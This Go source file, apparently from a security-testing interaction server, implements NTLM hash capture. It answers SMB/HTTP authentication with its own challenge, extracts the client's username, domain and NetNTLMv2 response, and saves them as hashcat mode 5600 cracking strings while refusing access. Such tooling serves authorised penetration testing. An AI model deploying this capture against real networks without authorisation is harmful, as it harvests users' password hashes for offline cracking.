package server

import (
	"context"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"sync/atomic"
	"time"

	"github.com/Mzack9999/goimpacket/pkg/ntlm"
	"github.com/Mzack9999/goimpacket/pkg/relay"
	"github.com/Mzack9999/goimpacket/pkg/utf16le"
	jsoniter "github.com/json-iterator/go"
	"github.com/projectdiscovery/gologger"
)

// ntlmCaptureTargetName is the SPNEGO target name advertised in the NTLM Type 2
// challenge. It is intentionally generic and matches what Responder advertises.
const ntlmCaptureTargetName = "WORKGROUP"

// runNTLMCapture drives goimpacket's relay protocol servers (SMB, HTTP, ...)
// purely for hash capture: we generate our own NTLM Type 2 challenge, parse
// the victim's Type 3 authenticate, format the result as a hashcat NetNTLMv2
// (mode 5600) string, persist it as an Interaction, and always reject the
// auth. Any number of capture servers can share the same channel.
func runNTLMCapture(ctx context.Context, srv relay.ProtocolServer, protocolName string, options *Options, statsCounter *uint64) error {
	authCh := make(chan relay.AuthResult)
	if err := srv.Start(authCh); err != nil {
		return fmt.Errorf("start %s capture server: %w", protocolName, err)
	}

	go func() {
		<-ctx.Done()
		_ = srv.Stop()
	}()

	for auth := range authCh {
		ntlmServer := ntlm.NewServer(ntlmCaptureTargetName)
		type2, err := ntlmServer.Challenge(auth.NTLMType1)
		if err != nil {
			gologger.Debug().Msgf("%s NTLM challenge build failed for %s: %s", protocolName, auth.SourceAddr, err)
			close(auth.Type2Ch)
			continue
		}

		// The 8-byte server challenge sits at bytes 24:32 of the Type 2 message
		// (MS-NLMP 2.2.1.2). We need it to compute the hashcat NetNTLMv2 line
		// later on, so snapshot it before forwarding to the victim.
		serverChallenge := make([]byte, 8)
		copy(serverChallenge, type2[24:32])

		auth.Type2Ch <- type2

		type3, ok := <-auth.Type3Ch
		if !ok || len(type3) == 0 {
			// Channel closed without a Type 3, nothing to record.
			select {
			case auth.ResultCh <- false:
			default:
			}
			continue
		}

		hash, user, domain, err := formatNetNTLMv2(type3, serverChallenge)
		if err != nil {
			gologger.Debug().Msgf("%s NetNTLMv2 extract failed for %s: %s", protocolName, auth.SourceAddr, err)
			auth.ResultCh <- false
			continue
		}

		if statsCounter != nil {
			atomic.AddUint64(statsCounter, 1)
		}

		interaction := &Interaction{
			Protocol:      protocolName,
			RawRequest:    hash,
			RemoteAddress: auth.SourceAddr,
			Timestamp:     time.Now(),
		}
		data, err := jsoniter.Marshal(interaction)
		if err != nil {
			gologger.Warning().Msgf("Could not encode %s interaction: %s\n", protocolName, err)
		} else {
			gologger.Debug().Msgf("%s NetNTLMv2 capture from %s as %s\\%s\n%s\n", protocolName, auth.SourceAddr, domain, user, hash)
			if err := options.Storage.AddInteractionWithId(options.Token, data); err != nil {
				gologger.Warning().Msgf("Could not store %s interaction: %s\n", protocolName, err)
			}
		}

		// Always fail the auth: we have no real backing session and we don't
		// want to grant the victim any access.
		auth.ResultCh <- false
	}

	return nil
}

// formatNetNTLMv2 parses an NTLMSSP_AUTH (Type 3) message and returns a
// hashcat NetNTLMv2 (mode 5600) formatted string along with the extracted
// username and domain. Field layout per MS-NLMP 2.2.1.3.
func formatNetNTLMv2(type3, serverChallenge []byte) (hash, user, domain string, err error) {
	le := binary.LittleEndian
	if len(type3) < 64 {
		return "", "", "", errors.New("type3 message too short")
	}

	ntLen := le.Uint16(type3[20:22])
	ntOff := le.Uint32(type3[24:28])
	if uint64(ntOff)+uint64(ntLen) > uint64(len(type3)) {
		return "", "", "", errors.New("nt response out of bounds")
	}
	ntResp := type3[ntOff : ntOff+uint32(ntLen)]
	if len(ntResp) < 16 {
		return "", "", "", errors.New("nt response too short for NTLMv2")
	}

	domLen := le.Uint16(type3[28:30])
	domOff := le.Uint32(type3[32:36])
	if uint64(domOff)+uint64(domLen) > uint64(len(type3)) {
		return "", "", "", errors.New("domain field out of bounds")
	}
	domain = utf16le.DecodeToString(type3[domOff : domOff+uint32(domLen)])

	userLen := le.Uint16(type3[36:38])
	userOff := le.Uint32(type3[40:44])
	if uint64(userOff)+uint64(userLen) > uint64(len(type3)) {
		return "", "", "", errors.New("user field out of bounds")
	}
	user = utf16le.DecodeToString(type3[userOff : userOff+uint32(userLen)])

	ntProof := ntResp[:16]
	blob := ntResp[16:]

	hash = fmt.Sprintf("%s::%s:%s:%s:%s",
		user, domain,
		hex.EncodeToString(serverChallenge),
		hex.EncodeToString(ntProof),
		hex.EncodeToString(blob),
	)
	return hash, user, domain, nil
}
